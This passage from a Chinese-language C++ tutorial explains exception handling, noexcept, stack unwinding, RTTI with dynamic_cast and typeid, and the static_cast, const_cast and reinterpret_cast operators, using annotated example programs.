of numbers: &quot;; continue; // 继续下一次循环输入 &#125; // ---- catch block ends ---- std::cout &lt;&lt; &quot;Enter next set of numbers &lt;q to quit&gt;: &quot;; &#125; std::cout &lt;&lt; &quot;Bye!\\n&quot;; return 0;&#125; 优点: 分离错误处理: 将错误处理代码与正常逻辑分开，使代码更清晰。 强制处理 (某种程度上): 未捕获的异常通常会导致程序终止，迫使开发者考虑错误处理。 自动传播: 异常会自动沿着调用栈向上传播，直到找到合适的处理程序，无需在每层函数手动传递错误码。 类型安全: 可以根据异常对象的类型来区分不同的错误，并进行相应的处理。 资源清理: 结合 RAII（资源获取即初始化），异常处理可以确保在异常发生时自动释放资源（通过栈解退时调用局部对象的析构函数）。 15.3.4 将对象用作异常类型throw 语句可以抛出任何类型的表达式结果，包括基本类型（如 int, const char*）或类类型的对象。 强烈建议使用类类型的对象作为异常类型，原因如下： 携带更多信息: 对象可以包含多个数据成员，携带关于错误的更丰富信息（错误码、错误描述、发生位置等）。 类型层次: 可以利用类的继承关系来组织异常类型。catch 块可以捕获基类类型的异常，从而处理该基类及其所有派生类的异常。这允许我们编写更通用的错误处理代码。 示例：自定义异常类 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889#include &lt;iostream&gt;#include &lt;string&gt;#include &lt;cmath&gt; // for sqrt// 自定义异常基类 (可以继承自 std::exception)class MathError &#123;public: virtual void report() const &#123; std::cerr &lt;&lt; &quot;Math error\\n&quot;; &#125; virtual ~MathError() &#123;&#125; // 虚析构函数很重要&#125;;// 派生异常类：无效参数class BadArgument : public MathError &#123;private: double arg1; double arg2; // 可能有多个参数 std::string funcName;public: BadArgument(double a1, double a2, const std::string&amp; fname) : arg1(a1), arg2(a2), funcName(fname) &#123;&#125; virtual void report() const override &#123; std::cerr &lt;&lt; &quot;Bad arguments to function &quot; &lt;&lt; funcName &lt;&lt; &quot;(): &quot; &lt;&lt; arg1 &lt;&lt; &quot;, &quot; &lt;&lt; arg2 &lt;&lt; std::endl; &#125;&#125;;// 派生异常类：定义域错误class DomainError : public MathError &#123;private: double value; std::string funcName;public: DomainError(double val, const std::string&amp; fname) : value(val), funcName(fname) &#123;&#125; virtual void report() const override &#123; std::cerr &lt;&lt; &quot;Domain error in function &quot; &lt;&lt; funcName &lt;&lt; &quot;(): &quot; &lt;&lt; &quot;Invalid value &quot; &lt;&lt; value &lt;&lt; std::endl; &#125;&#125;;// 函数可能抛出异常double my_sqrt(double x) &#123; if (x &lt; 0.0) &#123; throw DomainError(x, &quot;my_sqrt&quot;); // 抛出 DomainError 对象 &#125; return std::sqrt(x);&#125;double hmean_exc2(double a, double b) &#123; if (a == -b) &#123; throw BadArgument(a, b, &quot;hmean_exc2&quot;); // 抛出 BadArgument 对象 &#125; return 2.0 * a * b / (a + b);&#125;int main() &#123; double a = 10.0, b = -10.0; double c = -5.0; try &#123; std::cout &lt;&lt; &quot;Calculating hmean...\\n&quot;; double result1 = hmean_exc2(a, b); std::cout &lt;&lt; &quot;Hmean result: &quot; &lt;&lt; result1 &lt;&lt; std::endl; // 不会执行 std::cout &lt;&lt; &quot;Calculating sqrt...\\n&quot;; double result2 = my_sqrt(c); std::cout &lt;&lt; &quot;Sqrt result: &quot; &lt;&lt; result2 &lt;&lt; std::endl; // 不会执行 &#125; // catch 块的顺序很重要：派生类应在基类之前 catch (const BadArgument&amp; bae) &#123; std::cerr &lt;&lt; &quot;Caught BadArgument: &quot;; bae.report(); &#125; catch (const DomainError&amp; de) &#123; std::cerr &lt;&lt; &quot;Caught DomainError: &quot;; de.report(); &#125; catch (const MathError&amp; me) &#123; // 捕获所有 MathError 及其派生类 std::cerr &lt;&lt; &quot;Caught generic MathError: &quot;; me.report(); &#125; catch (...) &#123; // 捕获任何其他类型的异常 std::cerr &lt;&lt; &quot;Caught an unknown exception!\\n&quot;; &#125; std::cout &lt;&lt; &quot;Program continues after catch.\\n&quot;; return 0;&#125; 捕获顺序: 当使用继承层次结构的异常类时，catch 块的顺序非常重要。应该将派生类的 catch 块放在基类 catch 块之前。否则，基类 catch 块会首先捕获到派生类异常，导致派生类的特定处理逻辑无法执行。 按引用捕获: 推荐使用 const 引用 (const ExceptionType&amp; e) 来捕获异常。 避免对象**切片 (slicing)**：如果按值捕获基类异常，当抛出的是派生类对象时，派生类特有的部分会丢失。 避免复制开销。 使用 const 引用表明处理程序不打算修改捕获到的异常对象。 15.3.5 异常规范和 C++11 (throw(), noexcept)早期 C++ 允许使用异常规范 (Exception Specifications) 来声明函数可能抛出哪些类型的异常。 123void func1() throw(BadArgument, DomainError); // 可能抛出 BadArgument 或 DomainErrorvoid func2() throw(); // 保证不抛出任何异常void func3(); // 可能抛出任何类型的异常 (默认) 问题: 异常规范在实践中被证明效果不佳且难以维护。 编译器通常只在运行时检查，而不是编译时。 如果函数抛出了未在规范中列出的异常，程序的行为是调用 std::unexpected()，默认情况下它会调用 std::terminate()。 模板代码难以使用异常规范。 维护成本高，修改底层函数可能需要更新整个调用链的异常规范。 C++11 的改变: 废弃 throw(...) 规范: C++11 废弃了除 throw() 之外的动态异常规范。 引入 noexcept: C++11 引入了 noexcept 说明符，用于明确表示函数保证不抛出任何异常。 void func_no_throw() noexcept; // 保证不抛出 void func_maybe_throw(); // 可能抛出 (同 C++98 默认) noexcept 还可以带一个常量表达式参数：noexcept(expression)。如果表达式为 true，则函数保证不抛出；如果为 false，则可能抛出。 throw() 等价于 noexcept(true): 空的 throw() 规范在 C++11 中被视为等同于 noexcept(true)。 违反 noexcept: 如果一个声明为 noexcept 的函数实际上抛出了异常，程序会调用 std::terminate()，而不是进行栈解退来查找处理程序。这使得 noexcept 成为一个更强的保证，编译器可以利用它进行优化。 建议: 不要使用 C++11 废弃的动态异常规范 throw(Type1, Type2)。 如果函数确实能保证不抛出异常，或者即使抛出也应视为严重错误导致程序终止，请使用 noexcept。这对移动构造函数、移动赋值运算符和析构函数尤其重要，因为标准库的某些操作（如 std::vector 重新分配内存）依赖于这些操作的 noexcept 保证来提供强异常安全保证。 如果函数可能抛出异常，省略 noexcept (或使用 noexcept(false))。 15.3.6 栈解退 (Stack Unwinding)当异常被抛出时，程序会暂停当前函数的执行，并开始沿着函数调用链反向查找匹配的 catch 块。在这个过程中，已经执行完毕的函数（从 try 块开始到 throw 点）会依次退出，这个过程称为**栈解退 (Stack Unwinding)**。 关键点: 在栈解退过程中，函数调用栈上创建的局部对象会按照其构造相反的顺序被销毁，即它们的析构函数会被自动调用。 这就是 RAII (Resource Acquisition Is Initialization) 模式与异常处理协同工作的关键。如果资源（如动态内存、文件句柄、锁）由局部对象（如智能指针 std::unique_ptr, 文件流 std::ofstream, 锁守卫 std::lock_guard）在其生命周期内管理，那么即使发生异常，当栈解退导致这些局部对象被销毁时，它们的析构函数也会被调用，从而确保资源被正确释放。 123456789101112131415161718192021222324#include &lt;memory&gt; // for std::unique_ptr#include &lt;stdexcept&gt;void process_resource() &#123; std::unique_ptr&lt;int&gt; p_res(new int(10)); // RAII: 资源由 unique_ptr 管理 // ... 使用 p_res ... if (/* some error condition */ true) &#123; throw std::runtime_error(&quot;Something went wrong in process_resource&quot;); &#125; // ... 更多代码 ...&#125; // 如果正常结束，p_res 在这里销毁，释放内存 // 如果抛出异常，栈解退时 p_res 也会被销毁，释放内存void caller() &#123; try &#123; process_resource(); &#125; catch (const std::runtime_error&amp; e) &#123; // 处理异常 &#125;&#125; 注意: 如果在栈解退过程中，某个对象的析构函数自身抛出了异常，而此时已经有一个异常正在处理中，程序会调用 std::terminate()。因此，析构函数应该避免抛出异常（通常应声明为 noexcept）。 15.3.7 其他异常特性 重新抛出异常 (throw;): 在 catch 块内部，可以使用不带任何操作数的 throw; 语句将当前捕获到的异常重新抛出，交由外层的 catch 块处理。这允许一个 catch 块执行部分处理（如记录日志），然后将异常传递给更高层进行进一步处理。 12345678catch (const MyException&amp; e) &#123; log_error(e.what()); // 记录错误 if (can_handle_partially(e)) &#123; // ... 部分处理 ... &#125; else &#123; throw; // 重新抛出原始异常，让外层处理 &#125;&#125; 捕获所有异常 (catch(...)): catch(...) 可以捕获任何类型的异常。它通常放在所有其他 catch 块的最后，用于进行最终的清理或记录未知错误。在 catch(...) 块内部无法知道捕获到的异常的具体类型和信息（除非重新抛出给外层）。 12345catch (...) &#123; std::cerr &lt;&lt; &quot;Caught an unexpected exception type!\\n&quot;; // 可能进行一些通用清理 // throw; // 可以重新抛出，如果外层可能知道如何处理&#125; 15.3.8 exception 类C++ 标准库在 &lt;exception&gt; 头文件中定义了一个标准的异常基类 std::exception。标准库抛出的许多异常（如 std::bad_alloc, std::bad_cast, std::runtime_error, std::logic_error 等）都直接或间接从此类派生。 std::exception 提供了一个重要的虚成员函数： virtual const char* what() const noexcept; 返回一个描述异常的 C 风格字符串。派生类通常会覆盖此方法以提供更具体的错误信息。 建议自定义的异常类也继承自 std::exception 或其派生类，这样可以更容易地与标准库异常和通用的异常处理代码集成。 12345678910111213141516171819#include &lt;stdexcept&gt; // 包含 runtime_error, logic_error 等#include &lt;string&gt;class MyLogicError : public std::logic_error &#123;public: explicit MyLogicError(const std::string&amp; what_arg) : std::logic_error(what_arg) &#123;&#125; // what() 会继承 std::logic_error 的实现，返回构造时传入的字符串&#125;;int main() &#123; try &#123; throw MyLogicError(&quot;Custom logic error occurred&quot;); &#125; catch (const std::exception&amp; e) &#123; // 捕获所有标准异常及派生类 std::cerr &lt;&lt; &quot;Caught standard exception: &quot; &lt;&lt; e.what() &lt;&lt; std::endl; &#125; return 0;&#125; 标准异常类层次结构（部分）： 12345678910111213141516std::exception ├── std::logic_error │ ├── std::domain_error │ ├── std::invalid_argument │ ├── std::length_error │ └── std::out_of_range ├── std::runtime_error │ ├── std::overflow_error │ ├── std::underflow_error │ ├── std::range_error │ └── std::system_error (C++11) ├── std::bad_alloc (new 失败) ├── std::bad_cast (dynamic_cast 到引用失败) ├── std::bad_typeid (typeid 用于空指针) └── std::bad_exception (处理 unexpected() 时可能抛出) ... 15.3.9 异常、类和继承异常处理机制与类和继承良好地交互： 类对象作为异常: 如前所述，推荐使用类对象。 继承层次: 可以捕获基类异常来处理派生类异常。 构造函数中的异常: 如果构造函数在对象完全构造好之前抛出异常，该对象的析构函数不会被调用。但是，已经完全构造好的成员对象和基类子对象的析构函数会按照构造相反的顺序被调用（栈解退的一部分）。因此，构造函数需要特别注意资源管理，最好使用 RAII 成员（如智能指针）来避免资源泄漏。 析构函数中的异常: 析构函数不应该抛出异常。如果析构函数在栈解退过程中抛出异常，会导致 std::terminate()。如果析构函数内部的操作可能失败，应将失败信息记录下来或提供其他查询方式，而不是抛出异常。 15.3.10 异常何时会迷失方向 (Uncaught Exceptions)如果一个异常被抛出后，沿着调用栈一直传播到 main 函数之外都没有被任何 catch 块捕获，这个异常就称为**未捕获异常 (Uncaught Exception)**。 当发生未捕获异常时，C++ 运行时系统会调用 std::terminate() 函数（定义在 &lt;exception&gt; 中）。std::terminate() 的默认行为是调用 std::abort()，导致程序异常终止。 可以通过 std::set_terminate() 函数来注册一个自定义的终止处理程序，在 std::terminate() 被调用时执行一些自定义操作（如记录日志），但这个自定义处理程序最终也必须终止程序（例如通过调用 abort() 或 exit()），不能返回。 15.3.11 有关异常的注意事项 性能: 异常处理机制（特别是 throw 和栈解退）通常比返回错误码有更高的运行时开销。因此，异常应该用于处理异常情况，而不是用于正常的程序流程控制。对于预期会频繁发生的“错误”（如用户输入格式错误），可能使用错误码或其他方式更合适。 异常安全 (Exception Safety): 编写在发生异常时仍能保持正确状态（例如，不泄漏资源、保持数据一致性）的代码非常重要。RAII 是实现异常安全的关键技术。函数通常追求以下几种异常安全保证级别（从弱到强）： 基本保证 (Basic Guarantee): 操作失败时，对象保持在某个有效状态（不一定和操作前相同），没有资源泄漏。 强保证 (Strong Guarantee): 操作失败时，对象的状态回滚到操作开始之前的状态（事务性）。 不抛出保证 (Nothrow Guarantee): 操作保证不会抛出任何异常 (noexcept)。 析构函数: 绝对不要让析构函数抛出异常。 构造函数: 谨慎处理构造函数中的异常，使用 RAII 管理资源。 何时使用: 异常最适合处理那些阻止函数完成其预期任务的、不常见的错误情况，特别是当错误发生在深层嵌套调用中，需要将错误信息传递给高层调用者时。 异常处理是 C++ 中一个强大的错误处理工具，但也需要谨慎使用，并结合 RAII 等技术来确保程序的健壮性和资源的正确管理。 15.4 RTTI（运行时类型识别）RTTI 是 Runtime Type Identification 的缩写，即运行时类型识别。它是 C++ 的一项机制，允许程序在运行时发现和使用对象的实际类型信息。 通常，我们通过基类指针或引用来操作派生类对象（多态）。在这种情况下，代码只关心对象是否符合基类定义的接口。但有时，我们可能需要知道指针或引用实际指向的对象的确切派生类型，以便执行该派生类特有的操作。RTTI 就是为了解决这类问题而设计的。 RTTI 主要通过以下三个元素实现： dynamic_cast&lt;&gt; 运算符: 用于在类层次结构中进行**安全的向下转换 (Downcasting)**。它可以将基类指针或引用转换为派生类指针或引用，并在转换无效时提供明确的失败指示。 typeid() 运算符: 返回一个指向 std::type_info 对象的引用，该对象包含了关于操作数类型的信息（如类型名称）。 std::type_info 类: 存储特定类型信息的类。其具体内容因编译器而异，但标准保证它有一个 name() 方法返回类型的名称字符串，并可以比较两个 type_info 对象是否相等。 注意: RTTI 主要用于具有虚函数的类层次结构（即多态类）。对于没有虚函数的类，RTTI 的功能会受到限制（特别是 dynamic_cast 对指针的操作和 typeid 对解引用指针的操作）。编译器通常通过虚函数表 (vtable) 来存储 RTTI 所需的信息。 15.4.1 RTTI 的用途RTTI 主要用于以下场景： 安全的向下转换: 当你有一个基类指针或引用，并且你怀疑它可能指向某个特定的派生类对象，你想安全地将其转换为该派生类指针或引用，以便调用派生类特有的方法。 类型相关的特殊处理: 根据对象的实际类型执行不同的逻辑分支。 替代方案: 应该优先考虑使用虚函数来实现多态行为。如果不同的派生类需要以不同的方式执行某个操作，通常更好的设计是定义一个虚函数，让每个派生类提供自己的实现，而不是使用 RTTI 来判断类型并手动调用不同的代码。RTTI 往往被视为一种最后的手段，或者在特定框架（如图形界面库中的事件处理）中可能更常用。过度使用 RTTI 可能表明类设计存在问题。 15.4.2 RTTI 的工作原理1. dynamic_cast&lt;&gt; 运算符dynamic_cast 用于在继承层次结构中进行类型转换，特别是在运行时检查转换的有效性。 语法: 指针转换: dynamic_cast&lt;TargetType*&gt;(source_pointer) 引用转换: dynamic_cast&lt;TargetType&amp;&gt;(source_reference) 行为: 向上转换 (Upcasting): 将派生类指针/引用转换为基类指针/引用。dynamic_cast 可以执行此操作，但通常不需要，因为隐式转换即可。 向下转换 (Downcasting): 将基类指针/引用转换为派生类指针/引用。这是 dynamic_cast 的主要用途。 前提: 基类必须包含至少一个虚函数（即是多态基类），dynamic_cast 才能执行运行时的向下转换检查。如果基类没有虚函数，dynamic_cast 用于向下转换时通常会导致编译错误（或行为类似 static_cast，不安全）。 指针转换: 如果 source_pointer 确实指向一个 TargetType 类型的对象（或者是 TargetType 的派生类对象），则转换成功，返回指向该对象的 TargetType* 指针。 如果 source_pointer 指向的对象不是 TargetType 类型（或其派生类），或者 source_pointer 是 nullptr，则转换失败，返回 **nullptr**。 引用转换: 如果 source_reference 确实引用一个 TargetType 类型的对象（或者是 TargetType 的派生类对象），则转换成功，返回对该对象的 TargetType&amp; 引用。 如果 source_reference 引用的对象不是 TargetType 类型（或其派生类），则转换失败，抛出 std::bad_cast 异常（定义在 &lt;typeinfo&gt; 中）。 示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include &lt;iostream&gt;#include &lt;cstdlib&gt; // for rand(), srand()#include &lt;ctime&gt; // for time()#include &lt;typeinfo&gt; // for bad_cast#include &lt;stdexcept&gt; // for exceptionclass Grand &#123;private: int hold;public: Grand(int h = 0) : hold(h) &#123;&#125; virtual void Speak() const &#123; std::cout &lt;&lt; &quot;I am a grand class!\\n&quot;; &#125; virtual int Value() const &#123; return hold; &#125; virtual ~Grand() &#123;&#125; // 虚析构函数&#125;;class Superb : public Grand &#123;public: Superb(int h = 0) : Grand(h) &#123;&#125; void Speak() const override &#123; std::cout &lt;&lt; &quot;I am a superb class!!\\n&quot;; &#125; virtual void Say() const &#123; std::cout &lt;&lt; &quot;I hold the superb value of &quot; &lt;&lt; Value() &lt;&lt; &quot;!\\n&quot;; &#125;&#125;;class Magnificent : public Superb &#123;private: char ch;public: Magnificent(int h = 0, char c = &#x27;A&#x27;) : Superb(h), ch(c) &#123;&#125; void Speak() const override &#123; std::cout &lt;&lt; &quot;I am a magnificent class!!!\\n&quot;; &#125; void Say() const override &#123; std::cout &lt;&lt; &quot;I hold the magnificent value of &quot; &lt;&lt; Value() &lt;&lt; &quot; and the character &quot; &lt;&lt; ch &lt;&lt; &quot;!\\n&quot;; &#125;&#125;;// 函数：随机生成一个指向 Grand, Superb 或 Magnificent 对象的指针Grand * GetOne() &#123; Grand * p = nullptr; switch (std::rand() % 3) &#123; case 0: p = new Grand(std::rand() % 100); break; case 1: p = new Superb(std::rand() % 100); break; case 2: p = new Magnificent(std::rand() % 100, &#x27;A&#x27; + std::rand() % 26); break; &#125; return p;&#125;int main() &#123; std::srand(std::time(0)); Grand * pg; Superb * ps; Magnificent * pm; for (int i = 0; i &lt; 5; i++) &#123; pg = GetOne(); // 获取一个随机类型的对象指针 std::cout &lt;&lt; &quot;Now processing type #&quot; &lt;&lt; i+1 &lt;&lt; std::endl; pg-&gt;Speak(); // 调用虚函数，总是正确的 // 尝试向下转换为 Superb* ps = dynamic_cast&lt;Superb *&gt;(pg); if (ps != nullptr) &#123; // 检查转换是否成功 ps-&gt;Say(); // 如果是 Superb 或 Magnificent，可以调用 Say() &#125; else &#123; std::cout &lt;&lt; &quot; (Not a Superb or derived type)\\n&quot;; &#125; // 尝试向下转换为 Magnificent* pm = dynamic_cast&lt;Magnificent *&gt;(pg); if (pm != nullptr) &#123; // 如果是 Magnificent，可以调用 Say() (这里会调用 Magnificent 的版本) // pm-&gt;Say(); // 可以调用，但上面 Superb* 的 Say() 已经调用过了 std::cout &lt;&lt; &quot; (Also a Magnificent type)\\n&quot;; &#125; // 尝试使用引用转换 (如果失败会抛异常) try &#123; Superb &amp; rs = dynamic_cast&lt;Superb &amp;&gt;(*pg); // 尝试转换为 Superb 引用 std::cout &lt;&lt; &quot; Reference cast to Superb successful.\\n&quot;; // rs.Say(); // 可以调用 &#125; catch (const std::bad_cast &amp; bc) &#123; std::cout &lt;&lt; &quot; Reference cast to Superb failed: &quot; &lt;&lt; bc.what() &lt;&lt; std::endl; &#125; delete pg; // 清理内存 (需要虚析构函数) std::cout &lt;&lt; &quot;--------------------\\n&quot;; &#125; return 0;&#125; 2. typeid() 运算符typeid 运算符返回一个 const std::type_info&amp; 对象，表示其操作数的类型。 语法: typeid(expression): 返回表达式 expression 的运行时类型信息（如果表达式是解引用的多态指针或引用）。如果表达式不是多态类型，则返回其静态类型信息。 typeid(type-name): 返回类型 type-name 的类型信息。 std::type_info 类: name(): 返回一个实现定义的 C 风格字符串，表示类型的名称。名称的具体格式（例如是否包含命名空间、是否经过“修饰”/mangled）没有统一标准。 operator==: 可以比较两个 type_info 对象是否代表同一类型。 operator!=: 可以比较两个 type_info 对象是否代表不同类型。 before(): 用于确定一个类型在编译器的内部排序顺序中是否位于另一个类型之前（用途较少）。 注意: 要使用 typeid 和 type_info，需要包含 &lt;typeinfo&gt; 头文件。 如果 typeid 的操作数是一个**空指针 (nullptr)**，它会抛出 std::bad_typeid 异常。 如果 typeid 用于非多态类型（没有虚函数）的指针解引用，它返回的是指针的静态类型信息，而不是实际指向对象的类型信息。 示例: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;#include &lt;typeinfo&gt; // for typeid, type_info#include &lt;cstdlib&gt;#include &lt;ctime&gt;// 使用上面定义的 Grand, Superb, Magnificent 类和 GetOne() 函数int main() &#123; std::srand(std::time(0)); Grand * pg = nullptr; for (int i = 0; i &lt; 5; i++) &#123; pg = GetOne(); std::cout &lt;&lt; &quot;Pointer pg type (static): &quot; &lt;&lt; typeid(pg).name() &lt;&lt; std::endl; // 指针本身的类型 if (pg != nullptr) &#123; // 对指针解引用，获取运行时类型信息 (因为 Grand 有虚函数) std::cout &lt;&lt; &quot;Object pointed to by pg (runtime): &quot; &lt;&lt; typeid(*pg).name() &lt;&lt; std::endl; // 比较类型信息 if (typeid(*pg) == typeid(Grand)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Grand object.\\n&quot;; &#125; else if (typeid(*pg) == typeid(Superb)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Superb object.\\n&quot;; &#125; else if (typeid(*pg) == typeid(Magnificent)) &#123; std::cout &lt;&lt; &quot; It&#x27;s exactly a Magnificent object.\\n&quot;; &#125; // 检查是否是某种类型或其派生类 (通常 dynamic_cast 更适合) // 注意：typeid 比较的是精确类型，不会考虑继承关系 if (dynamic_cast&lt;Superb*&gt;(pg)) &#123; // 检查是否是 Superb 或其派生类 std::cout &lt;&lt; &quot; It&#x27;s a Superb or derived from Superb.\\n&quot;; &#125; delete pg; pg = nullptr; &#125; std::cout &lt;&lt; &quot;--------------------\\n&quot;; &#125; // 对空指针使用 typeid 会抛异常 try &#123; std::cout &lt;&lt; &quot;Type of *nullptr: &quot; &lt;&lt; typeid(*pg).name() &lt;&lt; std::endl; &#125; catch (const std::bad_typeid&amp; bt) &#123; std::cerr &lt;&lt; &quot;Caught bad_typeid exception: &quot; &lt;&lt; bt.what() &lt;&lt; std::endl; &#125; return 0;&#125; dynamic_cast vs typeid: dynamic_cast 主要用于安全的类型转换，并检查对象是否属于某个类型或其派生类。 typeid 主要用于获取对象的精确类型信息并进行比较。它不直接用于类型转换。 在需要根据类型执行不同操作时，如果这些操作可以通过虚函数实现，则优先使用虚函数。如果必须进行向下转换，dynamic_cast 通常是比 typeid 结合 static_cast 更安全的选择。 RTTI 和编译器选项: 某些编译器可能提供禁用 RTTI 的选项，以减少代码大小或运行时开销。如果禁用了 RTTI，dynamic_cast 和 typeid 的行为可能会改变或导致编译错误。 15.5 类型转换运算符C++ 继承了 C 语言的类型转换语法（例如 (TypeName) expression 或 TypeName(expression)）。然而，这种 C 风格的强制类型转换过于粗放，难以在代码中查找，并且无法区分不同类型的转换意图（例如，是去除 const 属性，还是在相关类型间转换，或是完全重新解释比特位）。 为了提供更安全、更明确的类型转换方式，C++ 引入了四个**类型转换运算符 (Type Cast Operators)**： static_cast&lt;&gt;() const_cast&lt;&gt;() reinterpret_cast&lt;&gt;() dynamic_cast&lt;&gt;() (已在 15.4 RTTI 中详细介绍) 这些运算符具有统一的语法格式：cast_name&lt;TargetType&gt;(expression)。它们使转换意图更加清晰，并且允许编译器进行更严格的检查。 1. static_cast&lt;TargetType&gt;(expression)static_cast 用于比较“自然”和“合理”的类型转换，主要是在相关类型之间进行转换，或者执行编译器能够理解的标准转换。它在编译时进行类型检查。 主要用途: 相关类型转换: 在类层次结构中进行向上转换（派生类指针/引用 -&gt; 基类指针/引用）。这是安全的，虽然通常隐式转换即可。 在类层次结构中进行向下转换（基类指针/引用 -&gt; 派生类指针/引用）。不安全！ static_cast 不进行运行时类型检查。如果基类指针实际指向的不是目标派生类对象，使用转换后的指针会导致未定义行为。只有当你确定指针确实指向目标类型时，才应使用 static_cast 进行向下转换（dynamic_cast 是更安全的选择）。 基本数据类型转换: 在数字类型之间进行转换（如 int 到 float, double 到 int）。 枚举与整型转换: 在枚举类型和整型或浮点类型之间转换。 void* 转换: 将任何类型的指针转换为 void*，或将 void* 转换回原始类型的指针（或兼容类型的指针）。 示例: 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;class Base &#123; public: virtual ~Base() &#123;&#125; &#125;; // 多态基类class Derived : public Base &#123;&#125;;int main() &#123; // 基本类型转换 double pi = 3.14159; int integer_pi = static_cast&lt;int&gt;(pi); // double to int (截断) std::cout &lt;&lt; &quot;integer_pi: &quot; &lt;&lt; integer_pi &lt;&lt; std::endl; // 输出 3 // 向上转换 (安全) Derived d; Base* pb = &amp;d; // 隐式转换即可 Base* pb_static = static_cast&lt;Base*&gt;(&amp;d); // 显式向上转换 // 向下转换 (不安全，需程序员保证) Base* pb_maybe_d = new Derived(); // 假设我们确定 pb_maybe_d 指向 Derived Derived* pd_static = static_cast&lt;Derived*&gt;(pb_maybe_d); std::cout &lt;&lt; &quot;Static downcast successful (programmer assumed).\\n&quot;; delete pb_maybe_d; Base* pb_not_d = new Base(); // !! 危险 !! pb_not_d 实际指向 Base，但我们强制转为 Derived* // Derived* pd_wrong = static_cast&lt;Derived*&gt;(pb_not_d); // pd_wrong-&gt;someDerivedMethod(); // *** 未定义行为 *** delete pb_not_d; // void* 转换 int i = 10; void* vp = static_cast&lt;void*&gt;(&amp;i); // int* to void* int* ip = static_cast&lt;int*&gt;(vp); // void* back to int* std::cout &lt;&lt; &quot;Value via void*: &quot; &lt;&lt; *ip &lt;&lt; std::endl; // 输出 10 return 0;&#125; 2. const_cast&lt;TargetType&gt;(expression)const_cast 是唯一能够移除 (cast away) 或添加 const 或 volatile 限定符的 C++ 转换运算符。 主要用途: 移除 const: 当你有一个指向 const 数据的指针或引用，但你需要调用一个不接受 const 参数（但实际上不会修改数据）的函数时，可以使用 const_cast 临时移除 const 属性。 添加 const: 虽然不常用，但也可以用来添加 const 属性。 重要警告: const_cast 只能改变指针或引用的 const/volatile 属性，不能改变表达式的类型。例如，不能用 const_cast 将 const char* 转换为 int*。 通过 const_cast 移除 const 属性后，如果原始对象本身就是 const 的，那么试图通过转换后的指针或引用去修改该对象的值，将导致**未定义行为 (Undefined Behavior)**！const_cast 主要用于处理接口不匹配的情况，而不是用来破坏常量性。 示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;// 假设有一个旧的 C 函数，它接受 char* 但保证不修改内容void legacy_print(char* str) &#123; std::cout &lt;&lt; &quot;Legacy print: &quot; &lt;&lt; str &lt;&lt; std::endl;&#125;int main() &#123; const char* const_message = &quot;Hello&quot;; // 调用 legacy_print 需要 char*，但我们只有 const char* // 我们知道 legacy_print 不会修改，所以使用 const_cast char* non_const_message = const_cast&lt;char*&gt;(const_message); legacy_print(non_const_message); // OK const int constant_value = 100; const int* p_const = &amp;constant_value; // 尝试移除 const 并修改 int* p_non_const = const_cast&lt;int*&gt;(p_const); // *p_non_const = 200; // *** 未定义行为！*** 因为 constant_value 本身是 const int variable_value = 50; const int* p_const_var = &amp;variable_value; int* p_non_const_var = const_cast&lt;int*&gt;(p_const_var); *p_non_const_var = 60; // OK，因为 variable_value 本身不是 const std::cout &lt;&lt; &quot;variable_value: &quot; &lt;&lt; variable_value &lt;&lt; std::endl; // 输出 60 return 0;&#125; 3. reinterpret_cast&lt;TargetType&gt;(expression)reinterpret_cast 用于执行低级别的、可能不安全的类型转换。它本质上只是要求编译器重新解释表达式的**比特模式 (bit pattern)**，将其视为 TargetType 类型。它很少进行实际的转换，更多的是一种编译时的指令。 主要用途: 指针与整型转换: 在指针类型和足够大的整型（如 uintptr_t）之间进行转换。 不相关指针类型转换: 在不相关的指针类型之间进行转换（例如，int* 到 char*）。这是非常危险的操作，通常只在需要对原始内存进行底层操作时使用。 函数指针转换: 在不同的函数指针类型之间转换（同样非常危险）。 重要警告: reinterpret_cast 的行为是高度依赖于具体实现和平台的。 使用 reinterpret_cast 进行的转换几乎总是不可移植的。 滥用 reinterpret_cast 极易导致未定义行为和难以调试的错误。 它应该只在绝对必要且完全理解其后果的情况下使用，通常用于与底层硬件或旧的 C 代码交互。 示例: 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include &lt;cstdint&gt; // for uintptr_tstruct Data &#123; int a; double b;&#125;;int main() &#123; int i = 65; // ASCII &#x27;A&#x27; // 指针类型转换 (危险) int* pi = &amp;i; // 将 int* 重新解释为 char* char* pc = reinterpret_cast&lt;char*&gt;(pi); // 结果取决于系统字节序 (endianness) std::cout &lt;&lt; &quot;Reinterpreted char: &quot; &lt;&lt; *pc &lt;&lt; std::endl; // 可能输出 &#x27;A&#x27; 或其他 // 指针与整数转换 uintptr_t addr_val = reinterpret_cast&lt;uintptr_t&gt;(pi); // 指针转整数 std::cout &lt;&lt; &quot;Address as integer: &quot; &lt;&lt; std::hex &lt;&lt; addr_val &lt;&lt; std::endl; int* pi_back = reinterpret_cast&lt;int*&gt;(addr_val); // 整数转回指针 std::cout &lt;&lt; &quot;Value via int-&gt;ptr-&gt;int: &quot; &lt;&lt; std::dec &lt;&lt; *pi_back &lt;&lt; std::endl; // 输出 65 // 不相关指针类型转换 (非常危险) Data d = &#123;1, 3.14&#125;; Data* pd = &amp;d; // 将 Data* 重新解释为 int* int* p_int_from_data = reinterpret_cast&lt;int*&gt;(pd); // 访问 *p_int_from_data 通常会得到 d.a 的值 (取决于内存布局) std::cout &lt;&lt; &quot;Reinterpreted int from Data*: &quot; &lt;&lt; *p_int_from_data &lt;&lt; std::endl; // 可能输出 1 return 0;&#125; 4. dynamic_cast&lt;TargetType&gt;(expression)dynamic_cast 用于在具有虚函数的类层次结构中进行安全的向下转换。它在运行时检查转换的有效性。 指针转换: 如果转换无效，返回 nullptr。 引用转换: 如果转换无效，抛出 std::bad_cast 异常。 (详细内容请参考 15.4 RTTI) 总结比较 运算符 主要用途 安全性 运行时检查 对 const/volatile 备注 static_cast 相关类型转换、数值转换、void* 转换 相对安全 否 不能移除 向下转换不安全 const_cast 移除或添加 const/volatile 低 (易未定义行为) 否 唯一能操作 不能改变基本类型，修改 const 对象是未定义行为 reinterpret_cast 低级别位模式重新解释、指针整数互转、不相关指针互转 非常低 否 不能移除 依赖实现、不可移植、极易出错 